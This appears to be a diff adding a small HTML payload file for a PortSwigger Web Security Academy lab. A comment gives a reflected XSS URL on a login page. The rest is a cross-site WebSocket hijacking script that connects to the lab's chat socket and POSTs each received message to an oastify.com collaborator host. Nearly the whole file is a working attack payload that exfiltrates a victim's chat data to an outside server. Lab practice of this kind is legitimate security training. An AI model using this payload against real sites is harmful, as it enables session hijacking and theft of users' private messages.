@@ -1,0 +1,6 @@
+<!--
+This is a oneliner.
+We use it with the XSS at https://cms-randomid.web-security-academy.net/login?username=<script>alert(0)</script>&password=b
+-->
+
+<script>console.log("Let's CSWH");var ws = new WebSocket("wss://0a790054032409e6808d44d300d300b7.web-security-academy.net/chat");ws.onopen = function() {console.log("We are connected !");ws.send("READY");};ws.onmessage = function() {console.log(event.data);fetch('https://ntkr0hojkfsku773drymanpbg2mtajy8.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});}</script>
